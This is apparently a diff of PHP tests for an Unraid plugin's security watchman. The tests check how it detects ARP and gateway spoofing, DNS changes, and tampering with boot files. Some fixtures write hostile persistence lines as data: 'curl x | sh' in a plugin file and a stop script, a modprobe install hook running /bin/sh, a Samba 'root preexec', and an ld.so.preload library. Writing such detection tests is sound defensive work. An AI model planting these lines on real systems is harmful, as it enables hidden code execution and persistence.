+        [$round($now + 2100), count($book), isset($known['gw']['192.168.1.1']['de:ad:be:ef:00:01'])]);
+    $arp('aa:bb:cc:00:00:01');
+    same('gateway: … and the first router back — quiet', [], $round($now + 2400));
+    // another gateway address (another network, another router): learned quietly
+    $route('FE01A8C0');
+    $arp('11:22:33:44:55:66', '0x2', '192.168.1.254');
+    same('gateway: another gateway address — learned, nothing said', [[], true], [$round($now + 2700), isset($known['gw']['192.168.1.254']['11:22:33:44:55:66'])]);
+    // no default route at all now: nothing said, nothing forgotten
+    file_put_contents("$src/route", "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n");
+    same('gateway: no default route now — nothing said, what is known stays', [[], 2], [$round($now + 3000), count($known['gw'])]);
+    // other DNS servers: net_dns, in the book but not told; brought up to date while open
+    file_put_contents("$src/resolv.conf", "nameserver 9.9.9.9\n");
+    $added = $round($now + 3300);
+    $d = end($book);
+    same('gateway: other DNS servers — net_dns with the servers now and before', [['net_dns'], ['servers' => ['9.9.9.9'], 'old' => ['1.1.1.1', '192.168.1.1']], false],
+        [$added, $d['p'], WATCH_KINDS['net_dns'][1]]);
+    file_put_contents("$src/resolv.conf", "nameserver 9.9.9.9\nnameserver 8.8.8.8\n");
+    $round($now + 3600);
+    same('gateway: … changed again while open — the same entry, brought up to date', [1, ['8.8.8.8', '9.9.9.9']],
+        [count(array_filter($book, fn ($x) => $x['kind'] === 'net_dns')), end($book)['p']['servers']]);
+    same('gateway: … its words', ['servers' => '8.8.8.8, 9.9.9.9', 'old' => '1.1.1.1, 192.168.1.1'], watchmanText(end($book)));
+    $b = ['lan' => $known];
+    watchmanAdopt($b, end($book), ['lan' => watchnetGateway($paths)], $now + 3700);
+    $known = $b['lan'];
+    $book[count($book) - 1]['noted'] = $now + 3700;
+    same('gateway: «I know, thanks» — these servers normal, nothing new; the router baseline (net) untouched',
+        [[], ['8.8.8.8', '9.9.9.9'], false], [$round($now + 3900), $known['dns'], array_key_exists('net', $b)]);
+
+    // the kinds, their area, the night, the mirror
+    same('gateway: net_gateway told, net_dns not; both «The network», their techniques',
+        [true, false, 'lan', 'lan', 'T1557.002', 'T1557'],
+        [WATCH_KINDS['net_gateway'][1], WATCH_KINDS['net_dns'][1], watchmanCatOf('net_gateway'), watchmanCatOf('net_dns'),
+         WATCH_ATTACK['net_gateway'], WATCH_ATTACK['net_dns']]);
+    // their entries in book-more.json (an office of 1.95 reads book.json alone and would drop them at its next write)
+    $more = (array) json_decode((string) json_encode(WATCH_KINDS_MORE), true);
+    $data = hardeningTmp('watch-gw-data');
+    watchmanSave($data, ['book' => []], ['book' => $book]);
+    same('gateway: both kinds in WATCH_KINDS_MORE — their entries in book-more.json, none in book.json, read as one',
+        [[], false, ['net_gateway', 'net_dns'], count($book)],
+        [array_values(array_diff(['net_gateway', 'net_dns'], $more)), is_file("$data/book.json") && readJson("$data/book.json")['entries'] !== [],
+         array_column(readJson("$data/book-more.json")['entries'], 'kind'), count(watchmanLoad($data)['book'])]);
+    same('book more: every kind listed there is one of his', [], array_values(array_diff($more, array_keys(WATCH_KINDS))));
+    $night = watchmanNightPaths();
+    same('gateway: the night shift looks too (RAM only)', ['/proc/net/route', '/proc/net/arp', '/etc/resolv.conf'],
+        [$night['route'] ?? null, $night['arp'] ?? null, $night['resolv'] ?? null]);
+    $m = watchmanMirror(['baseline' => ['hired' => 1, 'lan' => $known], 'state' => [], 'book' => []], 'boot', $now, true);
+    same('gateway: the flash mirror carries what is normal (addresses only, as the network\'s part does)', $known, $m['baseline']['lan'] ?? null);
+    $en = langFile(OFFICE_WEB . '/desks/watchman/lang/en.json');
+    same('gateway: their words', [], array_values(array_filter(['entry.net_gateway', 'entry.net_dns', 'fold.net_gateway', 'fold.net_dns'], fn ($k) => !isset($en[$k]))));
+    // the light of «The network» without a router log: what he looks at himself — a part not looked at, not grey
+    $s = ['time' => $now, 'hired' => true, 'on_watch' => $now - 86400, 'round' => ['failed' => false, 'lan' => true], 'book' => [], 'posture' => ['tips' => []],
+          'net' => ['state' => 'off', 'senders' => []], 'hold' => ['look' => null], 'wakes' => null];
+    same('gateway: «The network» without a router log — green with «!» (the router\'s own part not looked at); «The router» grey; without his look grey too',
+        [['note', ['no_router']], 'none', 'none'],
+        [[watchmanCats($s)['areas']['lan']['level'], watchmanCats($s)['areas']['lan']['why']], watchmanCats($s)['areas']['router']['level'],
+         watchmanCats(['round' => ['failed' => false]] + $s)['areas']['lan']['level']]);
+}
+
+/**
+ * What runs at the start (watchman-boot.php, concept 11 F): plugin files on the flash, stop, modprobe.d, the start line,
+ * smb-extra.conf, the kernel files, /etc/ld.so.preload. His first look is normal; a plugin the plugin manager installed or
+ * updated (its link in /var/log/plugins as new as the file, or a plain file there with the same content) and kernel
+ * files of an Unraid update are quiet; a plugin or kernel file changed otherwise counts after two rounds in a row; the
+ * rest at once; removed is forgotten; a group not looked at keeps what was known; «I know, thanks» adopts the file.
+ */
+function testWatchmanStartFiles(): void
+{
+    $src = hardeningTmp('watch-start');
+    foreach (['flash/plugins', 'log-plugins', 'modprobe.d', 'syslinux', 'boot'] as $d) {
+        @mkdir("$src/$d", 0755, true);
+    }
+    $now = 1790000000;
+    $paths = ['plugins' => "$src/log-plugins", 'flash_plg' => "$src/flash/plugins", 'flash_stop' => "$src/stop", 'modprobe_d' => "$src/modprobe.d",
+              'start_cfg' => ['syslinux' => "$src/syslinux/syslinux.cfg", 'grub' => "$src/grub.cfg"], 'smb_extra' => "$src/smb-extra.conf",
+              'boot_dir' => "$src/boot", 'os_changes' => "$src/boot/changes.txt", 'ld_preload' => "$src/ld.so.preload"];
+    $plg = fn (string $name, string $v) => "<?xml version='1.0'?>\n<!DOCTYPE PLUGIN [\n<!ENTITY version \"$v\">\n]>\n"
+        . "<PLUGIN name=\"$name\" version=\"&version;\" pluginURL=\"https://raw.githubusercontent.com/someone/$name/main/$name.plg\">\n</PLUGIN>\n";
+    $put = function (string $file, string $text, int $t) {
+        file_put_contents($file, $text);
+        touch($file, $t);
+        clearstatcache();
+    };
+    // installed as Unraid does it: the flash's file, linked in /var/log/plugins at $t
+    $link = function (string $name, int $t) use ($src) {
+        @unlink("$src/log-plugins/$name.plg");
+        symlink("$src/flash/plugins/$name.plg", "$src/log-plugins/$name.plg");
+        exec('touch -h -t ' . date('YmdHi.s', $t) . ' ' . escapeshellarg("$src/log-plugins/$name.plg"));
+        clearstatcache();
+    };
+    $put("$src/flash/plugins/ca.plg", $plg('ca', '2026.11.01'), $now - 86400);
+    $link('ca', $now - 86000);
+    $put("$src/flash/plugins/unRAIDServer.plg", $plg('unRAIDServer', '7.2.0'), $now - 86400);
+    $link('unRAIDServer', $now - 86000);
+    $put("$src/syslinux/syslinux.cfg", "default menu.c32\nlabel Unraid OS\n  kernel /bzimage\n  append initrd=/bzroot\n", $now - 86400);
+    $put("$src/smb-extra.conf", "[global]\n   server min protocol = SMB3\n", $now - 86400);
+    $put("$src/boot/bzimage", str_repeat('k', 100), $now - 86400);
+    $put("$src/boot/bzroot", str_repeat('r', 200), $now - 86400);
+    $put("$src/boot/changes.txt", "# Version 7.2.0\n", $now - 86400);
+    $put("$src/modprobe.d/zfs.conf", "options zfs zfs_arc_max=8589934592\n", $now - 86400);
+
+    $look = watchmanBootLook($paths);
+    same('start: looked at — every group, the files by id, Unraid\'s version, the plugins installed', [
+        ['plg', 'stop', 'modprobe', 'start', 'smb_extra', 'kernel', 'preload'],
+        ['kernel:bzimage', 'kernel:bzroot', 'modprobe:zfs.conf', 'plg:ca', 'plg:unRAIDServer', 'smb_extra', 'start:syslinux'], '7.2.0', ['ca', 'unRAIDServer'],
+        ['initrd=/bzroot']],
+        [$look['looked'], array_keys($look['files']), $look['os'], array_keys($look['installed']), $look['files']['start:syslinux']['opts']]);
+    same('start: none of its paths — not looked at', null, watchmanBootLook(['plugins' => "$src/log-plugins"]));
+    $known = null;
+    $book = [];
+    $round = function (int $t, ?array $p = null) use (&$known, &$book, &$look, $paths): array {
+        $look = watchmanBootLook($p ?? $paths, $look);
+        return watchmanBootCompare($known, $look, $book, $t);
+    };
+    same('start: the first look is normal', [[], []], [$round($now), $book]);
+    same('start: the same again — nothing', [], $round($now + 300));
+    same('start: what he keeps — sizes, times, hashes, the start options; never a text, never the links', [true, false, false],
+        [isset($known['files']['plg:ca']['h']), str_contains(jsonEncode($known), 'SMB3'), isset($known['installed'])]);
+
+    // a plugin updated by the plugin manager: the file and its link at the same time — the plugin watch's business, quiet
+    $put("$src/flash/plugins/ca.plg", $plg('ca', '2026.11.20'), $now + 400);
+    $link('ca', $now + 401);
+    same('start: a plugin updated as Unraid does it — quiet, known at once', [[], [], '2026.11.20'], [$round($now + 600), $book, $known['files']['plg:ca']['v'] ?? null]);
+    // the same file edited by hand on the flash, its link older: counts in the second round
+    $link('ca', $now - 1000);           // installed long before (the link's time)
+    $put("$src/flash/plugins/ca.plg", $plg('ca', '2026.11.20') . "<!-- curl x | sh -->\n", $now + 700);
+    same('start: a plugin file changed on the flash, nothing installed it — not yet in the first round', [[], []], [$round($now + 900), $book]);
+    same('start: … in the second round in a row: flash_boot, the changed plugin', [['flash_boot'], 'flash_boot:plg:ca', 'flash_boot_plg_changed', 'ca.plg', true],
+        [$round($now + 1200), $book[0]['key'] ?? null, watchmanEntryVariant($book[0]), $book[0]['p']['file'] ?? null, $book[0]['p']['installed'] ?? null]);
+    same('start: … the next round: the same entry, nothing new', [[], 1], [$round($now + 1500), count($book)]);
+    // «I know, thanks»: the file as the round saw it is normal
+    $b = ['flash' => ['boot' => $known]];
+    watchmanBootAdopt($b, $book[0], ['flash' => ['boot' => $look]]);
+    $known = $b['flash']['boot'];
+    $book[0]['noted'] = $now + 1600;
+    same('start: «I know, thanks» — the file is normal, nothing new', [[], 1], [$round($now + 1800), count($book)]);
+
+    // a new plugin dropped on the flash, not installed: installed at the next start
+    $put("$src/flash/plugins/evil.plg", $plg('evil', '1'), $now + 1900);
+    $round($now + 2100);
+    $added = $round($now + 2400);
+    $e = end($book);
+    same('start: a plugin on the flash nothing installed — told in the second round', [['flash_boot'], 'flash_boot_plg', 'evil.plg', '1', false, true],
+        [$added, watchmanEntryVariant($e), $e['p']['file'], $e['p']['version'], $e['p']['installed'], $e['p']['new']]);
+    same('start: … in his words', ['file' => 'evil.plg', 'version' => '1', 'added' => '–', 'removed' => '–', 'exec' => '–'], watchmanBootText($e));
+    // … installed a moment later after all (the plugin manager): known quietly, his entry stays (what was there was real)
+    $link('evil', $now + 2500);
+    same('start: … installed after all — known, quiet', [[], true], [$round($now + 2700), isset($known['files']['plg:evil'])]);
+
+    // an Unraid update: the kernel files and Unraid's own plugin change together — quiet
+    $put("$src/boot/bzroot", str_repeat('R', 210), $now + 2800);
+    $put("$src/boot/changes.txt", "# Version 7.2.1\n", $now + 2800);
+    $put("$src/flash/plugins/unRAIDServer.plg", $plg('unRAIDServer', '7.2.1'), $now + 2800);
+    $link('unRAIDServer', $now + 2801);
+    $n = count($book);
+    same('start: an Unraid update — quiet', [[], $n, '7.2.1'], [$round($now + 3000), count($book), $known['os']]);
+    // a kernel file swapped without one: counts in the second round
+    $put("$src/boot/bzimage", str_repeat('x', 100), $now + 3100);
+    $round($now + 3300);
+    same('start: a kernel file changed without an update — flash_boot in the second round', [['flash_boot'], 'flash_boot_kernel', 'bzimage'],
+        [$round($now + 3600), watchmanEntryVariant(end($book)), end($book)['p']['file']]);
+
+    // the start line: what changed, at once
+    $put("$src/syslinux/syslinux.cfg", "default menu.c32\nlabel Unraid OS\n  kernel /bzimage\n  append initrd=/bzroot mitigations=off\n", $now + 3700);
+    $added = $round($now + 3900);
+    $e = end($book);
+    same('start: the start line changed — at once, the options named', [['flash_boot'], 'flash_boot_start', 'syslinux.cfg', ['mitigations=off'], []],
+        [$added, watchmanEntryVariant($e), $e['p']['file'], $e['p']['added'], $e['p']['removed']]);
+    same('start: GRUB\'s linux line — its options, not the kernel\'s file', ['boot=/dev/sda1', 'quiet'],
+        watchmanBootOpts("menuentry 'Unraid' {\n  linux /bzimage quiet boot=/dev/sda1\n  initrd /bzroot\n}\n"));
+    // stop, modprobe.d, smb-extra.conf: at once
+    $put("$src/stop", "#!/bin/bash\ncurl x | sh\n", $now + 4000);
+    $put("$src/modprobe.d/evil.conf", "install usb-storage /bin/sh -c 'x'\n", $now + 4000);
+    $put("$src/smb-extra.conf", "[global]\n   server min protocol = SMB3\n   root preexec = /tmp/x\n", $now + 4000);
+    $added = $round($now + 4200);
+    $by = [];
+    foreach ($book as $x) {
+        $by[$x['key']] = $x;
+    }
+    same('start: the shutdown script, a driver option file, Samba\'s extra settings — at once, Samba\'s program settings named',
+        [['flash_boot', 'flash_boot', 'flash_boot'], 'flash_boot_stop', 'flash_boot_modprobe', 'flash_boot_smb_extra', ['root preexec'], true],
+        [$added, watchmanEntryVariant($by['flash_boot:stop']), watchmanEntryVariant($by['flash_boot:modprobe:evil.conf']),
+         watchmanEntryVariant($by['flash_boot:smb_extra']), $by['flash_boot:smb_extra']['p']['exec'], $by['flash_boot:stop']['p']['new']]);
+    same('start: never a file\'s text in the entries (only the options and Samba\'s setting names)', [false, false],
+        [str_contains(jsonEncode($book), 'curl'), str_contains(jsonEncode($book), '/tmp/x')]);
+    // removed: safer — forgotten, nothing new
+    unlink("$src/modprobe.d/zfs.conf");
+    $n = count($book);
+    same('start: a file removed — forgotten quietly', [[], $n, false], [$round($now + 4500), count($book), isset($known['files']['modprobe:zfs.conf'])]);
+    // a group not looked at (the plugins at boot, before Unraid installed them): what was known stays
+    $p2 = array_diff_key($paths, ['flash_plg' => 1]);
+    $round($now + 4800, $p2);
+    same('start: the plugins not looked at — what was known about them stays', true, isset($known['files']['plg:ca'], $known['files']['plg:evil']));
+    // a file read only when its size or time changed
+    $before = $known['files']['smb_extra']['h'];
+    $put("$src/smb-extra.conf", "[global]\n   server min protocol = SMB3\n   root preexec = /tmp/y\n", $now + 4000);
+    $round($now + 5100);
+    same('start: a file the same in size and time isn\'t read again', $before, $known['files']['smb_extra']['h']);
+
+    // /etc/ld.so.preload: shouldn't be there — new: ld_preload, its names
+    file_put_contents("$src/ld.so.preload", "# x\n/usr/lib/libevil.so\n");
+    clearstatcache();
+    $added = $round($now + 5400);
+    $e = end($book);
+    same('start: /etc/ld.so.preload appears — ld_preload with what it loads', [['ld_preload'], 'ld_preload', ['/usr/lib/libevil.so'], ['names' => '/usr/lib/libevil.so']],
+        [$added, $e['kind'], $e['p']['names'], watchmanBootText($e)]);
+    same('start: the kinds — flash_boot with the flash, ld_preload the server itself; both told, their techniques',
+        ['flash', 'host', true, true, 'T1037', 'T1574.006'],
+        [watchmanCatOf('flash_boot'), watchmanCatOf('ld_preload'), WATCH_KINDS['flash_boot'][1], WATCH_KINDS['ld_preload'][1],
+         WATCH_ATTACK['flash_boot'], WATCH_ATTACK['ld_preload']]);
+    // their entries in book-more.json (an office of 1.95 reads book.json alone and would drop them at its next write)
+    $more = (array) json_decode((string) json_encode(WATCH_KINDS_MORE), true);
+    $data = hardeningTmp('watch-start-data');
+    watchmanSave($data, ['book' => []], ['book' => array_merge([watchmanEntry('flash_user', 'flash_user:zed', $now, ['user' => 'zed'])], $book)]);
+    same('start: both kinds in WATCH_KINDS_MORE — their entries in book-more.json, the rest in book.json, read as one',
+        [[], ['flash_user'], ['flash_boot', 'ld_preload'], count($book) + 1],
+        [array_values(array_diff(['flash_boot', 'ld_preload'], $more)), array_column(readJson("$data/book.json")['entries'], 'kind'),
+         array_values(array_unique(array_column(readJson("$data/book-more.json")['entries'], 'kind'))), count(watchmanLoad($data)['book'])]);
+    // every shape of the entry has its words in every language (testStrings checks the five agree)
+    $en = langFile(OFFICE_WEB . '/desks/watchman/lang/en.json');
+    same('start: every shape of the entry has its words', [], array_values(array_filter(array_map(fn ($e) => 'entry.' . (watchmanEntryVariant($e) ?? $e['kind']), $book),
+        fn ($k) => !isset($en[$k]))));
+    // the round's paths and the night's: all of them looked at in the night (the flash and /etc are its ground)
+    same('start: the round looks at them, the night shift too', [[], []],
+        [array_values(array_diff(array_keys(watchmanBootPaths()), array_keys(watchmanPaths()))), array_values(array_diff(array_keys(watchmanBootPaths()), array_keys(watchmanNightPaths())))]);
+}
+
 /**
  * The night watchman's look at the host (SOC, 1.30): listeners from ss, accounts in RAM, logs emptied outside their
  * rotation, programs from scratch folders (a stand-in /proc of links), the office's own schedule lines, ATT&CK ids.
@@ -29705,8 +35089,10 @@ function testWatchmanHost(): void
     $on = array_merge($off, ['notify' => true]);        // a variable: the state goes by reference
     same('chains: with the reports off never told, also not later', [[], []], [$quiet, watchmanChainsDue($cb, $on, $now + 21300, true, 'en')]);
     putenv('OFFICE_NOTIFY_BIN');
-    same('attack: every kind has its technique, in ATT&CK\'s shape', [[], []],
-        [array_values(array_diff(array_keys(WATCH_KINDS), array_keys(WATCH_ATTACK))),
+    // the hardware's kinds (1.96, hw_*) have none: none of it is an attack (concept 11.4)
+    same('attack: every kind has its technique, in ATT&CK\'s shape — the hardware\'s none', [[], [], []],
+        [array_values(array_diff(array_keys(WATCH_KINDS), array_keys(WATCH_ATTACK), array_filter(array_keys(WATCH_KINDS), fn ($k) => str_starts_with($k, 'hw_')))),
+         array_values(array_filter(array_keys(WATCH_ATTACK), fn ($k) => str_starts_with($k, 'hw_'))),
          array_values(array_filter(WATCH_ATTACK, fn ($t) => !preg_match('/^T\d{4}(\.\d{3})?$/D', $t)))]);
     exec('rm -rf ' . escapeshellarg($tmp));
 }
@@ -30329,9 +35715,10 @@ function testParityWhy(): void
     $sched = $sched > $up ? $sched : mktime(3, 0, 12, (int) date('n', $up) + 1, 1, (int) date('Y', $up));
     $setVar($sched, 0, 'check P', 100);
     watchmanRound($paths, $day, 1000, $sched + 200, $docker, true, $acks);
-    $e = $entries();
+    // a month on: the older lines (noted by himself, quiet a week) are in his history (1.96 step 7) — the newest stays in the book
+    $e = array_values(array_filter($entries(), fn ($x) => ($x['p']['reason'] ?? null) === 'schedule'));
     same('parity: a check on Unraid\'s schedule', ['schedule', 'Parity check on schedule (Settings → Scheduler → Parity Check)'],
-        [$e[6]['p']['reason'] ?? null, officeNotifyText('watchman', 'entry.parity_check', watchmanText($e[6], 'en'), 'en')]);
+        [$e[0]['p']['reason'] ?? null, isset($e[0]) ? officeNotifyText('watchman', 'entry.parity_check', watchmanText($e[0], 'en'), 'en') : null]);
     same('parity: the plain line\'s words on his page exist in all five', true,
         (bool) array_product(array_map(fn ($l) => officeNotifyText('watchman', 'noted.parity', ['when' => 'x'], $l) !== 'noted.parity', ['en', 'de', 'it', 'fr', 'es'])));
 
@@ -30345,7 +35732,8 @@ function testParityWhy(): void
     file_put_contents($paths['syslog'], $bootLog($up, true));
     watchmanRound($paths, $day, 1000, $up + 90, $docker, true, $acks);
     same('parity: his notify switch off — the line and the to-do, no notification', ['unclean', 'parity_crash', 3],
-        [$entries()[7]['p']['reason'] ?? null, watchmanParityFinding($day)['id'] ?? null, count($calls())]);
+        [array_values(array_filter($entries(), fn ($x) => $x['key'] === 'parity_check:' . ($up + 41)))[0]['p']['reason'] ?? null, watchmanParityFinding($day)['id'] ?? null,
+         count($calls())]);
     same('parity: the night shift has none of his parity paths (it never looks)', [],
         array_values(array_intersect(array_keys(watchmanNightPaths()), ['parity_log', 'parity_cron', 'pct_dir', 'boot_logs', 'domain_cfg', 'docker_cfg'])));
     $np = $paths;
@@ -30491,9 +35879,8 @@ function testWatchmanApiDoor(): void
         [$tips['api_admin']['level'] ?? null, $tips['api_admin']['p']['names'] ?? null, $tips['api_admin']['p']['n'] ?? null, $tips['api_admin']['link']['path'] ?? null]);
     $checks = array_column(watchmanChecks($day), null, 'id');
     $kinds = array_column(watchmanFindings(watchmanLoad($day)['book']), null, 'id');
-    same('api: both kinds on his list, the team lead\'s one line counts them, and the advice', ['recommended', 'recommended', 'recommended', true, 'hint'],
-        [$kinds['api_key_new']['level'] ?? null, $kinds['api_key_changed']['level'] ?? null, $checks['open']['level'] ?? null,
-         ($checks['open']['params']['n'] ?? 0) >= 2, $checks['posture']['level'] ?? null]);
+    same('api: both kinds on his list; at the team lead only the advice (1.96: no line for open entries)', ['recommended', 'recommended', false, 'hint'],
+        [$kinds['api_key_new']['level'] ?? null, $kinds['api_key_changed']['level'] ?? null, isset($checks['open']), $checks['posture']['level'] ?? null]);
     $syslogged = (string) @file_get_contents("$tmp/syslogged");
     check('api: the SIEM line carries the kind and the technique', str_contains($syslogged, '"kind":"api_key_new"') && str_contains($syslogged, '"attack":"T1098"'));
     check('api: told to Unraid\'s notifications', str_contains((string) @file_get_contents("$tmp/notified"), 'Remote tool'));
@@ -31121,7 +36508,7 @@ function testWatchmanSnaps(): void
     same('snaps gone in words', '3 snapshots vanished on hazel — not removed by the office: hazel/data@manual2, hazel/data@uso-backup-20261006-0100, hazel/media@uso-plan-x-20261005-0100',
         officeNotifyText('watchman', 'entry.snap_gone', ['n' => 3] + watchmanText($g, 'en'), 'en'));
     $checks = array_column(watchmanFindings(watchmanLoad($data)['book']), null, 'id');
-    same('snaps: both on his list (the team lead\'s one line counts them) — important, so to Unraid\'s notifications too', ['recommended', 'recommended', true, true, true],
+    same('snaps: both on his list (1.96: nothing of it at the team lead) — important, so to Unraid\'s notifications too', ['recommended', 'recommended', true, true, false],
         [$checks['snap_gone']['level'] ?? null, $checks['snap_hold_released']['level'] ?? null, WATCH_KINDS['snap_gone'][1], WATCH_KINDS['snap_hold_released'][1],
          isset(array_column(watchmanChecks($data), null, 'id')['open'])]);
     same('snaps: the sleeping pool named', ['cold', 'disk3'], $summary()['asleep'] ?? null);
@@ -42789,7 +48176,7 @@ function testWatchWakesPage(): void
         check('watchman wakes page: ran under node', false, $raw);
         return;
     }
-    check("watchman wakes page: his tile and section under node ({$r['pass']} checks)", $r['pass'] >= 11 && !$r['fail']);
+    check("watchman wakes page: his tile and section under node ({$r['pass']} checks)", $r['pass'] >= 16 && !$r['fail']);
     foreach ($r['fail'] as $f) {
         check('watchman wakes page: ' . ($f[0] ?? '?'), false, 'got ' . json_encode($f[1] ?? null) . ', want ' . json_encode($f[2] ?? null));
     }
@@ -43468,6 +48855,76 @@ function testWatchmanWakeTrail(): void
         $dt = [watchmanWakeReaction($sensors), array_column(watchmanWakeShaped($old)['who'], 'prog'), watchmanWakeShaped($old)['unraid']];
         same('watchman trail: sensors without a drivetemp hwmon is Unraid\'s look (now and in an older agent\'s entry), with drivetemp a cause it can be',
             [[true, [], [], true], [false, ['sensors'], false]], [$plain, $dt]);
+        $GLOBALS['watchmanWakeSys'] = $sys;
+
+        // 2026-11-25 (nostromo): Fanboy's control waits in state D on a slow NVMe sensor (1 s a read) and was named at every
+        // wake, `maybe` — and hid shfs and the open files. It and the `nvme` tool read nothing a rotating disk answers:
+        // left out without a drivetemp hwmon (with one, as for sensors, he stays a `maybe`); a `maybe` never hides the rest
+        $bp = "$tmp/proc-by";
+        $mkp = function (int $pid, string $comm, string $state, string $cmd, array $fds = []) use ($bp): void {
+            foreach (['fd', 'fdinfo', 'ns'] as $d) {
+                @mkdir("$bp/$pid/$d", 0700, true);
+            }
+            file_put_contents("$bp/$pid/stat", "$pid ($comm) $state 1 0 0 0 -1 0 0 0 0 0 0 0 0 0 20 0 1 0 0 0\n");
+            file_put_contents("$bp/$pid/cmdline", str_replace(' ', "\0", $cmd) . "\0");
+            file_put_contents("$bp/$pid/cgroup", "0::/\n");
+            @symlink('mnt:[4026531840]', "$bp/$pid/ns/mnt");
+            foreach ($fds as $i => $target) {
+                symlink($target, "$bp/$pid/fd/" . ($i + 3));
+            }
+        };
+        $mkp(1, 'init', 'S', '/sbin/init');
+        $mkp(30, 'php', 'D', '/usr/bin/php /usr/local/emhttp/plugins/unraid-secretary-office/agent/agent.php ramjob fanboy-control', ['/dev/null']);
+        $mkp(31, 'nvme', 'D', 'nvme get-feature /dev/nvme2n1 -f2');
+        $mkp(32, 'shfs', 'D', '/usr/libexec/unraid/shfs /mnt/user -disks 31', ['/mnt/disk2/Docs/a.odt']);
+        $bases = ['Docs' => ['disk2']];
+        $look = function (?array $mounts = null) use ($bp, $bases): array {
+            $c = watchmanWakeCapture($bp, $mounts === null ? [] : ['mounts' => $mounts]);
+            return [array_column($c['who'], 'prog'), array_column($c['open'], 'pid'),
+                    array_map(fn (array $w): string => $w['prog'] . ':' . $w['sure'], watchmanWakeCauses([$c], ['/mnt/disk2'], $bases))];
+        };
+        $GLOBALS['watchmanWakeSys'] = "$tmp/sys-plain";
+        $fb = ['kind' => 'office', 'prog' => 'php', 'desk' => '', 'pid' => 30, 'files' => [],
+               'cmd' => '/usr/bin/php /usr/local/emhttp/plugins/unraid-secretary-office/agent/agent.php ramjob fanboy-control'];
+        same('watchman wakes: Fanboy\'s control and `nvme` are bystanders, the control\'s children and other office jobs are not',
+            [true, true, false, false, false],
+            [watchmanWakeBystander($fb), watchmanWakeBystander(['kind' => 'program', 'prog' => 'nvme', 'cmd' => '/usr/sbin/nvme smart-log /dev/nvme0']),
+             watchmanWakeBystander(['kind' => 'office', 'prog' => 'ipmitool', 'cmd' => 'ipmitool sdr']),
+             watchmanWakeBystander(['kind' => 'office', 'prog' => 'php', 'cmd' => '/usr/bin/php /usr/local/emhttp/plugins/unraid-secretary-office/agent/agent.php job fanboy-step']),
+             watchmanWakeBystander(['kind' => 'program', 'prog' => 'smartctl', 'cmd' => 'smartctl -A /dev/nvme0'])]);
+        $plain = [$look()];
+        $GLOBALS['watchmanWakeSys'] = "$tmp/sys-dt";
+        $dt = [$look()];
+        same('watchman wakes: Fanboy + nvme + shfs waiting — without drivetemp only shfs is left (the share); with drivetemp Fanboy stays, last, and no longer hides shfs',
+            [[['shfs'], [], ['shfs:sure']]], $plain);
+        same('watchman wakes: … with drivetemp: Fanboy a `maybe` beside shfs, ranked last; `nvme` never', [[['php', 'shfs'], [], ['shfs:sure', 'php:maybe']]], $dt);
+        // a file open on the woken disk: the fallback runs although Fanboy (drivetemp: a `maybe`) waits
+        $mkp(33, 'cat', 'S', 'cat /mnt/disk2/Media/x.mkv', ['/mnt/disk2/Media/x.mkv']);
+        $dt[] = $look();
+        $GLOBALS['watchmanWakeSys'] = "$tmp/sys-plain";
+        $plain[] = $look();
+        same('watchman wakes: a `maybe` and a file open on the woken disk — the open file found, named before the `maybe`; without drivetemp only it',
+            [[['php', 'shfs'], [33], ['cat:open', 'php:maybe']], [['shfs'], [33], ['cat:open']]], [$dt[1], $plain[1]]);
+        // a real cause waiting with a file on the woken disk: it leads; shfs and the open files as before (not needed)
+        $mkp(34, 'rsync', 'D', 'rsync -a /mnt/disk2/Fotos /mnt/remotes/nas', ['/mnt/disk2/Fotos/a.jpg']);
+        $GLOBALS['watchmanWakeSys'] = "$tmp/sys-dt";
+        same('watchman wakes: a `sure` cause beside Fanboy — it leads, shfs and the open files not looked for; on another disk than asked for it doesn\'t count as found',
+            [[['php', 'rsync'], [], ['rsync:sure', 'php:maybe']], [['php', 'rsync', 'shfs'], [33]]],
+            [$look(['/mnt/disk2']), array_slice($look(['/mnt/disk5']), 0, 2)]);
+        $GLOBALS['watchmanWakeSys'] = "$tmp/sys-plain";
+        same('watchman wakes: … without drivetemp only rsync', ['rsync:sure'], $look(['/mnt/disk2'])[2]);
+        // entries an older agent kept (today's on nostromo): read without Fanboy and `nvme`, a real cause beside them stays
+        $old = ['id' => 'f1', 'time' => 1795000000, 'disks' => ['disk1', 'disk2'], 'how' => 'caught', 'who' => [
+            ['kind' => 'office', 'prog' => 'php', 'cmd' => '/usr/bin/php /usr/local/emhttp/plugins/unraid-secretary-office/agent/agent.php ramjob fanboy-control', 'sure' => 'maybe', 'files' => []],
+            ['kind' => 'program', 'prog' => 'nvme', 'cmd' => 'nvme get-feature /dev/nvme2n1 -f2', 'sure' => 'maybe', 'files' => []]]];
+        $old2 = ['who' => array_merge([['kind' => 'container', 'prog' => 'rsync', 'id' => 'abc', 'cmd' => 'rsync', 'sure' => 'sure', 'files' => ['/mnt/disk2/a']]], $old['who'])] + $old;
+        $r = [watchmanWakeShaped($old)['who'], watchmanWakeShaped($old)['unraid'], array_column(watchmanWakeShaped($old2)['who'], 'prog')];
+        $GLOBALS['watchmanWakeSys'] = "$tmp/sys-dt";
+        $r[] = array_column(watchmanWakeShaped($old2)['who'], 'prog');
+        same('watchman wakes: an older entry naming Fanboy and `nvme` — nobody named (not «Unraid looked» either), a real cause beside them stays; with drivetemp Fanboy stays',
+            [[], false, ['rsync'], ['rsync', 'php']], $r);
+        same('watchman wakes: an NVMe in disks.ini is never a disk that wakes — not even without its `rotational`', [],
+            watchmanWakeDisks(['fast' => ['name' => 'fast', 'device' => 'nvme1n1', 'type' => 'Cache', 'spundown' => '1']]));
         $GLOBALS['watchmanWakeSys'] = $sys;
 
         // the bounded reader: ended at its byte limit, said so
@@ -44207,7 +49664,7 @@ function testWatchmanNetIpsFamilies(): void
     }
     same('ips words: the list\'s entry and «I know, thanks» in all five languages, the list by its name', [], $gaps);
     check('ips words: the page shows the list\'s «I know, thanks» on a block list\'s entry',
-        str_contains((string) file_get_contents(OFFICE_WEB . '/desks/watchman/desk.js'), "T('adopt.' + (e.v === 'net_ips_server_list' ? e.v : e.kind))"));
+        str_contains((string) file_get_contents(OFFICE_WEB . '/desks/watchman/desk.js'), "T('adopt.' + (e.v === 'net_ips_server_list' || e.v === 'login_new_user' ? e.v : e.kind))"));
 }
 
 /** The type of the first fixture line holding $needle (after $from, a marker), for testWatchmanNetMikrotik() */
@@ -44570,6 +50027,12 @@ function testWatchmanNetMikrotik(): void
     touch($mt, $t2 + 110);
     $round($t2 + 300);
